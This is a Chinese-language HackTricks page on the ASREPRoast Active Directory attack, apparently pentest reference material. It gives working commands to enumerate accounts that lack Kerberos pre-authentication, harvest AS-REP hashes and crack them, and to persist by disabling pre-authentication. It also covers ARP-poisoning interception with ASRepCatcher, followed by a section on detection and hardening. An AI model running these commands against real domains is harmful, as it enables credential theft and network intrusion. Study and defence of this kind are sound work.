# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast 是一种安全攻击，利用缺少 **Kerberos 预身份验证必需属性** 的用户。基本上，此漏洞允许攻击者向域控制器（DC）请求对某个用户进行身份验证，而无需该用户的密码。随后，DC 会返回一条使用该用户密码派生密钥加密的消息，攻击者可以尝试离线破解该消息以获取用户密码。

此攻击的主要要求包括：

- **未启用 Kerberos 预身份验证**：目标用户必须未启用此安全功能。
- **连接到域控制器（DC）**：攻击者需要访问 DC，以发送请求并接收加密消息。
- **可选的域账户**：拥有域账户可以让攻击者通过 LDAP 查询更高效地识别存在漏洞的用户。没有此类账户时，攻击者必须猜测用户名。

#### 枚举存在漏洞的用户（需要域凭据）

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### 请求 AS_REP 消息

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus 默认请求 **RC4**，因此 Event ID **4768** 通常会显示 **preauth type 0** 和 **ticket encryption type 0x17**。如果添加 **`/aes`**（或目标已禁用 RC4），则预期会使用 **AES etypes**。<sup>[[2]](#references)</sup>

#### 快速单行命令（Linux）

- 先用 Kerberos userenum 枚举潜在目标（例如，从泄露的构建路径中获取）：`kerbrute userenum users.txt -d domain --dc dc.domain`
- 使用 NetExec 对整个用户名列表进行 AS-REP roast，无需有效凭据：`netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- 如果你有凭据，可让 NetExec 查询 LDAP，并为你请求所有可进行 roast 的账户：`netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- 如果输出以 **`$krb5asrep$23$`** 开头，使用 Hashcat **`-m 18200`** 破解。如果以 **`$krb5asrep$17$`** 或 **`$krb5asrep$18$`** 开头，优先使用 John **`--format=krb5asrep`**。<sup>[[1]](#references)[[2]](#references)</sup>

### 破解

不要假设每个 AS-REP roast 都使用 RC4。现代工具可能返回 **RC4**（`$krb5asrep$23$`）或 **AES**（`$krb5asrep$17$` / `$krb5asrep$18$`），具体取决于请求或协商使用的加密类型。**`hashcat -m 18200`** 用于 **etype 23**，而 **John** 可直接处理 `krb5asrep` 的 **17/18/23**。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### 持久化

对于你拥有 **GenericAll** 权限（或拥有写入属性的权限）的用户，可强制其不需要 **preauth**：

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### 检测与加固

成功的**无预身份验证 AS-REP 请求**会在 DC 上生成一个 **4768** 事件，且 `Status=0x0`、`PreAuthType=0`；这只记录了请求，并不能证明有人破解了响应或攻陷了该账户。检测时不要要求 RC4：`TicketEncryptionType=0x17` 是有用的弱加密信号，但攻击者也可以请求 AES（事件日志值为 `0x11`/`0x12`）。在安装了 2025 年 1 月 14 日（或更新）累积更新的 Windows Server 2016 及更高版本上，版本 2 的 4768 事件还会公开 `ClientAdvertizedEncryptionTypes`、账户/DC 支持的 etype 以及可用密钥。<sup>[[5]](#references)</sup>

一种实用的排查方式是标记仅通告 RC4、但账户拥有 AES 密钥的客户端，然后关联同一源 IP 针对多个无预身份验证用户发起的突发请求。应先为合法例外建立基线，而不是对每个 `PreAuthType=0` 事件都触发告警。

进行归因时，先规范化 `IpAddress` 字段（其中可能包含映射 IPv4 的 `::ffff:`），再将其时间窗口与 4769 服务票证事件或 5140 共享访问事件进行比较。这些事件可能会列出从同一地址活动的账户，但无预身份验证的 AS-REP 请求不需要经过身份验证的账户。共享主机、NAT、代理和多个会话意味着，IP 匹配**无法**确定发送 AS-REQ 的人员或账户。将相关账户视为调查线索，并通过端点或网络证据进行佐证。<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

持久有效的修复措施是：对所有并非严格需要预身份验证的用户取消勾选 **Do not require Kerberos preauthentication**，并轮换已暴露账户的密码。如果无法移除例外，应使用长且随机生成的密码，并赋予最少权限。禁用 RC4 会提高破解成本，但不会消除 roastability，因为 AES AS-REP 响应仍可离线破解。<sup>[[2]](#references)[[5]](#references)</sup>

## 无凭据 ASREProast

on-path 攻击者可以捕获正常的、经过预身份验证的 AS 交换期间返回的 AS-REP，并将其加密部分整理成可供离线破解的格式。与经典的 ASREPRoasting 不同，此方法不需要 `DONT_REQ_PREAUTH`；不过，它只能获取 Kerberos 交换确实被拦截的账户。**ASRepCatcher** 默认通过单向 ARP poisoning 获取中间人位置，也可以使用 `--disable-spoofing` 接收其他 MitM 技术捕获的流量。<sup>[[6]](#references)</sup>\
如果你想了解相关的无凭据技巧——从无预身份验证的主体获取**服务票证**而不是 **TGT**，请参阅 [Kerberoast](kerberoast.md)。

在 `relay` 模式下，[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 会转发拦截到的 AS-REQ，并在双方仍允许时强制使用 **RC4**。`listen` 不会修改数据包，因此会捕获客户端与 DC 协商出的任意 enctype。尽可能使用 `-t`/`-tf` 限定 poisoning 范围，而不是影响整个子网。<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – 事件 4768：请求了 Kerberos 身份验证票证](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – 安全事件 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – 安全事件 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
